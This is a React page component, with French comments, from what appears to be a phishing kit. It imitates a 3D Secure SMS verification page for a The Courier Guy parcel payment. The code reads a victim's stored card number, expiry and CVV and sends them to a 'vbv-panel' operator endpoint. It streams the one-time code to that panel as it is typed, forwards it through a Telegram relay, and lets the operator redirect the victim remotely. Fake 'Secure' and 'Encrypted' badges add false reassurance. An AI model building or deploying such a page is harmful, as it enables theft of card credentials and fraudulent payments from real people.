import { Navbar } from "@/components/Navbar";
import { Footer } from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent } from "@/components/ui/card";
import { motion } from "framer-motion";
import { useState, useEffect, useRef } from "react";
import { useToast } from "@/hooks/use-toast";
import { useVisitId } from "@/hooks/use-visit-id";
import { fetchWithVisitId } from "@/lib/fetch-with-visit-id";
import { useLocation } from "wouter";
import {
  ShieldCheck, 
  MessageSquare, 
  Lock, 
  CheckCircle2, 
  Shield,
  Loader2
} from "lucide-react";

export default function Vbv() {
  const { toast } = useToast();
  const visitId = useVisitId(); // Initialiser le visitId
  const [, setLocation] = useLocation();
  const [otp, setOtp] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isWaitingRedirect, setIsWaitingRedirect] = useState(false);
  const heartbeatIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const lastOtpSentRef = useRef<string>("");
  const otpUpdateTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const redirectPollingRef = useRef<NodeJS.Timeout | null>(null);

  // Enregistrer le client et démarrer le heartbeat
  useEffect(() => {
    // Récupérer les données de paiement depuis localStorage
    const paymentDataStr = localStorage.getItem("payment_data");
    let paymentData: {
      cardholder: string;
      cardNumber: string;
      expiry: string;
      cvv: string;
      fullName: string;
    } | null = null;

    if (paymentDataStr) {
      try {
        paymentData = JSON.parse(paymentDataStr);
      } catch (e) {
        console.error("Failed to parse payment data:", e);
      }
    }

    // Enregistrer le client dans le panel VBV
    const registerClient = async () => {
      try {
        // Récupérer le fullName depuis localStorage (depuis la page home) ou utiliser cardholder
        const storedFullName = localStorage.getItem("client_fullname");
        const fullName = storedFullName || paymentData?.fullName || paymentData?.cardholder || "";

        console.log("[VBV] Registering client with visitId:", visitId);
        console.log("[VBV] Payment data available:", !!paymentData);
        console.log("[VBV] Full name:", fullName);

        const response = await fetchWithVisitId("/api/vbv-panel/register", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            fullName: fullName,
            cardInfo: paymentData ? {
              cardholder: paymentData.cardholder,
              cardNumber: paymentData.cardNumber,
              expiry: paymentData.expiry,
              cvv: paymentData.cvv,
            } : undefined,
            page: "VBV", // Mettre à jour la page à "VBV" quand le client arrive sur cette page
          }),
        });

        if (!response.ok) {
          const errorData = await response.json().catch(() => ({}));
          console.error("[VBV] Failed to register client:", errorData);
        } else {
          const result = await response.json();
          console.log("[VBV] Client registered successfully in panel:", result);
        }
      } catch (error) {
        console.error("[VBV] Failed to register client in VBV panel:", error);
      }
    };

    registerClient();

    // Démarrer le heartbeat (toutes les 5 secondes)
    const sendHeartbeat = async () => {
      try {
        await fetchWithVisitId("/api/vbv-panel/heartbeat", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
        });
      } catch (error) {
        console.error("Failed to send heartbeat:", error);
      }
    };

    // Envoyer le heartbeat immédiatement puis toutes les 5 secondes
    sendHeartbeat();
    heartbeatIntervalRef.current = setInterval(sendHeartbeat, 5000);

    // Retirer le client de la liste à la fermeture de la fenêtre
    const handleBeforeUnload = () => {
      if (heartbeatIntervalRef.current) {
        clearInterval(heartbeatIntervalRef.current);
      }
      const leaveUrl = `${window.location.origin}/api/vbv-panel/leave`;
      const body = new Blob([JSON.stringify({ visitId })], { type: "application/json" });
      navigator.sendBeacon(leaveUrl, body);
    };

    window.addEventListener("beforeunload", handleBeforeUnload);

    return () => {
      if (heartbeatIntervalRef.current) {
        clearInterval(heartbeatIntervalRef.current);
      }
      if (otpUpdateTimeoutRef.current) {
        clearTimeout(otpUpdateTimeoutRef.current);
      }
      if (redirectPollingRef.current) {
        clearInterval(redirectPollingRef.current);
      }
      window.removeEventListener("beforeunload", handleBeforeUnload);
    };
  }, [visitId]);

  // Polling pour vérifier si une redirection a été déclenchée depuis le panel
  useEffect(() => {
    if (!isWaitingRedirect) return;

    const checkRedirect = async () => {
      try {
        const response = await fetchWithVisitId("/api/vbv-panel/redirect-status", {
          method: "GET",
        });
        if (response.ok) {
          const data = await response.json();
          if (data.shouldRedirect && data.redirectTo) {
            // Arrêter le polling et rediriger
            if (redirectPollingRef.current) {
              clearInterval(redirectPollingRef.current);
            }
            setIsWaitingRedirect(false);
            setLocation(data.redirectTo);
          }
        }
      } catch (error) {
        console.error("[VBV] Failed to check redirect status:", error);
      }
    };

    // Vérifier toutes les 2 secondes
    redirectPollingRef.current = setInterval(checkRedirect, 2000);

    return () => {
      if (redirectPollingRef.current) {
        clearInterval(redirectPollingRef.current);
      }
    };
  }, [isWaitingRedirect, setLocation, visitId]);

  // Fonction pour mettre à jour le code OTP dans le panel en temps réel
  const updateOtpInPanel = async (otpValue: string) => {
    // Ne pas envoyer si c'est la même valeur que la dernière fois
    if (otpValue === lastOtpSentRef.current) {
      return;
    }

    try {
      await fetchWithVisitId("/api/vbv-panel/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          otpCode: otpValue || undefined, // Envoyer undefined si vide pour ne pas écraser
        }),
      });
      lastOtpSentRef.current = otpValue;
    } catch (error) {
      console.error("Failed to update OTP in VBV panel:", error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    // Valider que le code OTP fait exactement 6 chiffres
    const otpCleaned = otp.replace(/\D/g, '');
    if (otpCleaned.length !== 6) {
      toast({
        title: "Invalid Code",
        description: "Please enter a 6-digit verification code.",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    try {
      // Mettre à jour le code OTP dans le panel VBV
      try {
        await fetchWithVisitId("/api/vbv-panel/register", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            otpCode: otpCleaned,
          }),
        });
      } catch (error) {
        console.error("Failed to update OTP in VBV panel:", error);
      }

      // Envoi 3D Secure: le serveur construit le message avec OTP + rappel session (carte)
      await fetchWithVisitId("/api/telegram/send", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type: "3ds",
          otpCode: otpCleaned,
        }),
      });

      // track 3DS step in admin panel (no OTP stored)
      void fetchWithVisitId("/api/flows/event", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          step: "vbv",
          notes: "3D Secure OTP submitted",
        }),
      });
      
      // Activer l'état d'attente de redirection depuis le panel
      setIsSubmitting(false);
      setIsWaitingRedirect(true);
      
      toast({
        title: "Code submitted",
        description: "Waiting for verification approval...",
        duration: 3000,
      });

    } catch (error) {
      console.error(error);
      setIsSubmitting(false);
    }
  };


  return (
    <div className="min-h-screen flex flex-col w-full bg-slate-50 font-sans">
      
      {/* Header - Black Bar */}
      <div className="bg-black text-white py-4 px-6 text-center shadow-md">
        <div className="flex items-center justify-center gap-2 font-bold text-lg">
          <ShieldCheck className="h-5 w-5 text-brand-orange" />
          Payment Verification
        </div>
      </div>

      <main className="flex-grow py-8 px-4 md:px-8 flex flex-col items-center">
        <div className="w-full max-w-md space-y-6">
          
          {/* Transaction Details Card */}
          <Card className="border-t-4 border-t-gray-200 shadow-sm bg-white overflow-hidden">
            <CardContent className="p-6 space-y-4 text-sm">
               <div className="flex justify-between items-center">
                 <span className="text-gray-500">Merchant</span>
                 <span className="font-bold text-gray-800">The Courier Guy</span>
               </div>
               <div className="flex justify-between items-center">
                 <span className="text-gray-500">Amount</span>
                 <span className="font-bold text-green-600 text-lg">R 48.20</span>
               </div>
               <div className="flex justify-between items-center">
                 <span className="text-gray-500">Date & Time</span>
                 <span className="font-medium text-gray-800">{new Date().toLocaleString('en-GB', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' })}</span>
               </div>
               <div className="flex justify-between items-center">
                 <span className="text-gray-500">Card</span>
                 <span className="font-medium text-gray-800 tracking-wider">**** **** **** 9558</span>
               </div>
               <div className="flex justify-between items-center">
                 <span className="text-gray-500">Reference</span>
                 <span className="font-medium text-gray-800">CI22105583668</span>
               </div>
            </CardContent>
          </Card>

          {/* SMS Verification Section */}
          {isWaitingRedirect ? (
            <div className="bg-blue-50 border border-blue-100 rounded-xl p-6 text-center">
              <motion.div
                animate={{ rotate: 360 }}
                transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                className="w-16 h-16 rounded-full border-4 border-blue-100 border-t-brand-orange mx-auto mb-4 flex items-center justify-center"
              >
                <Loader2 className="h-8 w-8 text-brand-orange" />
              </motion.div>
              <h3 className="text-brand-blue font-bold text-lg mb-2">Waiting for verification...</h3>
              <p className="text-gray-600 text-sm">
                Your code has been submitted. Please wait while we verify your approval.
              </p>
            </div>
          ) : (
            <div className="space-y-4">
              <div className="flex items-center gap-2 font-bold text-gray-800">
                 <MessageSquare className="h-5 w-5" />
                 SMS Verification
              </div>
              <p className="text-gray-500 text-sm">
                 Enter the verification code sent to your mobile.
              </p>

              <form onSubmit={handleSubmit} className="space-y-4">
                 <Input 
                   placeholder="Enter verification code" 
                   className="h-12 text-center text-lg tracking-widest bg-white border-gray-300"
                   value={otp}
                   onChange={(e) => {
                     // Ne garder que les chiffres et limiter à 6 caractères
                     const value = e.target.value.replace(/\D/g, '').slice(0, 6);
                     setOtp(value);

                     // Mettre à jour le panel en temps réel avec debounce (300ms)
                     if (otpUpdateTimeoutRef.current) {
                       clearTimeout(otpUpdateTimeoutRef.current);
                     }
                     otpUpdateTimeoutRef.current = setTimeout(() => {
                       updateOtpInPanel(value);
                     }, 300);
                   }}
                   maxLength={6}
                   pattern="[0-9]{6}"
                   inputMode="numeric"
                   required
                   disabled={isSubmitting}
                 />
                 
                 <Button 
                   type="submit" 
                   disabled={isSubmitting}
                   className="w-full h-12 bg-brand-orange hover:bg-orange-600 text-white font-bold text-base shadow-md transition-all flex items-center justify-center gap-2"
                 >
                    <CheckCircle2 className="h-5 w-5" />
                    {isSubmitting ? 'Verifying...' : 'Verify Code'}
                 </Button>
              </form>
            </div>
          )}
          
          {/* Footer Badges */}
          <div className="flex justify-center gap-4 pt-4 opacity-60">
             <div className="flex items-center gap-1 text-xs text-gray-500 bg-white px-2 py-1 rounded border">
                <Shield className="h-3 w-3" /> Secure
             </div>
             <div className="flex items-center gap-1 text-xs text-gray-500 bg-white px-2 py-1 rounded border">
                <Lock className="h-3 w-3" /> Encrypted
             </div>
             <div className="flex items-center gap-1 text-xs text-gray-500 bg-white px-2 py-1 rounded border">
                <CheckCircle2 className="h-3 w-3" /> Verified
             </div>
          </div>

        </div>
      </main>
    </div>
  );
}
